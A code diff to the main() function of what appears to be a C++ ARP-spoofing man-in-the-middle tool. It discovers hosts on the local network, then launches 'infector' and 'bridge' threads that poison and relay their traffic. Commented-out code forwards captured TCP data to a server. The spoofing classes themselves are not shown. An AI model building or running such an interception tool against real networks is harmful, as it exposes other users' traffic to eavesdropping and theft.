@@ -40,25 +40,25 @@ int main(int argc, char* argv[])
     dataMagician.initSockAddr();
 //    dataMagician.connectToServ();
 
+//    char errbuf[PCAP_ERRBUF_SIZE];
+//    pcap_t* pcd = pcap_open_offline("test7.pcap",errbuf);
+//    if(pcd == NULL)
+//    {
+//        cout<<"pcd open error!"<<endl;
+//        cout<<errbuf<<endl;
+//    }
 
-    //    pcap_t* pcd = pcap_open_offline("test3.pcap",errbuf);
-    //    if(pcd == NULL)
-    //    {
-    //        cout<<"pcd open error!"<<endl;
-    //        cout<<errbuf<<endl;
-    //    }
+//    uint8_t* recv_data=nullptr;     //This is not same as uint8 **
 
-    //    uint8_t* recv_data=nullptr;     //This is not same as uint8 **
+//    int data_len;
 
-    //    int data_len;
-
-    //    while(recvPacket(pcd,&recv_data,data_len))
-    //    {
-    //        if(parseEther(&recv_data,data_len,ETHERTYPE_IP))
-    //            if(parseIP(&recv_data,data_len,IPPROTO_TCP))
-    //                if(parseTCPData(&recv_data,data_len))
-    //                    dataMagician.sendToServ(recv_data,data_len);
-    //    }
+//    while(recvPacket(pcd,&recv_data,data_len))
+//    {
+//        if(parseEther(&recv_data,data_len,ETHERTYPE_IP))
+//            if(parseIP(&recv_data,data_len,IPPROTO_TCP))
+//                if(parseTCPData(&recv_data,data_len))
+//                    dataMagician.sendToServ(recv_data,data_len);
+//    }
 
     /*********** Data reply ************/
 
@@ -70,9 +70,11 @@ int main(int argc, char* argv[])
 
     //send ARP Request for All user in same network
     hostDetector.askHost();
-//    cout<<hostDetector.getLocalMacAddr()<<endl;
     sleep(3);
     hostDetector.hostPrinter();
+
+    //shutting down host dectector
+    hostDetector.semaphore();
 
     Spoofer spoofer;
     spoofer.setLocal_mac(hostDetector.getLocalMacAddr());
@@ -83,7 +85,7 @@ int main(int argc, char* argv[])
     //Run Client Infector
     thread t_infector(&Spoofer::infector,&spoofer,hostDetector.getAddresses());
     //Run Data Parser && save to pcap
-    thread t_parserRun(&DataMagician::parserRun,&dataMagician);
+//    thread t_parserRun(&DataMagician::parserRun,&dataMagician);
     //Run Relay function
     thread t_bridge(&Spoofer::bridge,&spoofer);
 
@@ -91,7 +93,7 @@ int main(int argc, char* argv[])
 
     t_host_adder.join();
     t_infector.join();
-    t_parserRun.join();
+//    t_parserRun.join();
     t_bridge.join();
     return 0;
 }
